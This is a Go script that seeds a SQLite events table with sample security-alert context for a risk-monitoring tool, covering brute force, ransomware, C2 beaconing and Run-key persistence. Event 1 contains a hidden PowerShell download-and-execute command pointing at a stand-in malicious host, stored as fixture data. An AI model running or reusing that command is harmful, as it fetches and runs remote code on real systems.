package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	// Open database
	db, err := sql.Open("sqlite3", "data/riskmatrix.db")
	if err != nil {
		log.Fatal("Failed to open database:", err)
	}
	defer db.Close()

	fmt.Println("Updating events with context information...")

	// Sample context data for different types of events
	contextData := map[int]map[string]interface{}{
		1: {
			"process_name":    "powershell.exe",
			"command_line":    "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\"",
			"parent_process":  "explorer.exe",
			"user":           "john.doe",
			"host":           "WORKSTATION-01",
			"pid":            1234,
			"ppid":           567,
			"severity":       "high",
			"indicators":     []string{"suspicious_url", "bypass_execution_policy", "hidden_window"},
		},
		2: {
			"source_ip":      "192.168.1.100",
			"target_user":    "jane.smith",
			"failed_attempts": 15,
			"time_window":    "5 minutes",
			"protocols":      []string{"RDP", "SSH"},
			"geolocation":    "Unknown",
			"user_agent":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
			"severity":       "medium",
			"indicators":     []string{"brute_force", "multiple_protocols", "rapid_attempts"},
		},
		3: {
			"source_host":    "workstation-01",
			"destination_ip": "185.220.101.42",
			"port":          443,
			"protocol":      "HTTPS",
			"bytes_sent":    1024000,
			"bytes_received": 2048000,
			"duration":      "30 minutes",
			"domain":        "suspicious-domain.tor",
			"severity":      "high",
			"indicators":    []string{"tor_network", "large_data_transfer", "encrypted_traffic"},
		},
		4: {
			"user":          "admin",
			"host":          "server-db-01",
			"privilege_from": "user",
			"privilege_to":   "administrator",
			"method":        "UAC bypass",
			"process":       "svchost.exe",
			"technique":     "T1548.002",
			"severity":      "critical",
			"indicators":    []string{"privilege_escalation", "uac_bypass", "system_process"},
		},
		5: {
			"source_ip":     "192.168.1.100",
			"target_range":  "10.0.0.0/24",
			"ports_scanned": []int{22, 23, 80, 135, 139, 443, 445, 3389},
			"scan_type":     "TCP SYN",
			"duration":      "2 minutes",
			"packets_sent":  1024,
			"responses":     45,
			"severity":      "low",
			"indicators":    []string{"port_scan", "reconnaissance", "network_discovery"},
		},
		6: {
			"source_ip":      "10.0.0.50",
			"target_service": "SSH",
			"target_port":    22,
			"attempts":       500,
			"duration":       "10 minutes",
			"usernames":      []string{"admin", "root", "user", "test", "guest"},
			"attack_pattern": "dictionary",
			"severity":       "high",
			"indicators":     []string{"brute_force", "ssh_attack", "dictionary_attack"},
		},
		7: {
			"host":           "WORKSTATION-01",
			"user":           "john.doe",
			"files_encrypted": 1247,
			"file_extensions": []string{".docx", ".xlsx", ".pdf", ".jpg", ".png"},
			"ransom_note":    "README_DECRYPT.txt",
			"encryption_key": "AES-256",
			"process":        "malware.exe",
			"severity":       "critical",
			"indicators":     []string{"ransomware", "file_encryption", "mass_file_modification"},
		},
		8: {
			"user":           "jane.smith",
			"dns_queries":    []string{"malicious-c2.com", "phishing-site.net", "crypto-miner.org"},
			"query_count":    45,
			"dns_server":     "8.8.8.8",
			"response_codes": []string{"NXDOMAIN", "NOERROR"},
			"time_pattern":   "regular_intervals",
			"severity":       "medium",
			"indicators":     []string{"dns_tunneling", "c2_communication", "suspicious_domains"},
		},
		9: {
			"host":           "workstation-01",
			"registry_key":   "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			"value_name":     "SecurityUpdate",
			"value_data":     "C:\\Windows\\Temp\\update.exe",
			"process":        "regedit.exe",
			"user":           "SYSTEM",
			"severity":       "high",
			"indicators":     []string{"persistence", "registry_modification", "autostart"},
		},
		10: {
			"host":           "server-db-01",
			"database":       "customer_data",
			"query_type":     "SELECT",
			"rows_accessed":  50000,
			"user":           "db_admin",
			"time":           "03:00 AM",
			"query_pattern":  "bulk_export",
			"severity":       "high",
			"indicators":     []string{"data_exfiltration", "unusual_time", "bulk_access"},
		},
		11: {
			"source_ip":      "192.168.1.100",
			"techniques":     []string{"ping_sweep", "port_scan", "service_enumeration"},
			"targets_found":  15,
			"services_identified": []string{"HTTP", "SSH", "RDP", "SMB"},
			"duration":       "15 minutes",
			"tools_used":     []string{"nmap", "masscan"},
			"severity":       "medium",
			"indicators":     []string{"network_reconnaissance", "enumeration", "discovery"},
		},
		12: {
			"source_ip":      "10.0.0.50",
			"c2_server":      "malicious-command.com",
			"protocol":       "HTTPS",
			"beacon_interval": "60 seconds",
			"data_sent":      "system_info, user_list, network_config",
			"encryption":     "TLS 1.3",
			"severity":       "critical",
			"indicators":     []string{"c2_communication", "data_exfiltration", "malware_beacon"},
		},
	}

	// Update events with context information
	for eventID, context := range contextData {
		contextJSON, err := json.Marshal(context)
		if err != nil {
			log.Printf("Error marshaling context for event %d: %v", eventID, err)
			continue
		}

		_, err = db.Exec("UPDATE events SET context = ? WHERE id = ?", string(contextJSON), eventID)
		if err != nil {
			log.Printf("Error updating context for event %d: %v", eventID, err)
		} else {
			fmt.Printf("Updated context for event %d\n", eventID)
		}
	}

	fmt.Println("Event context update completed!")
}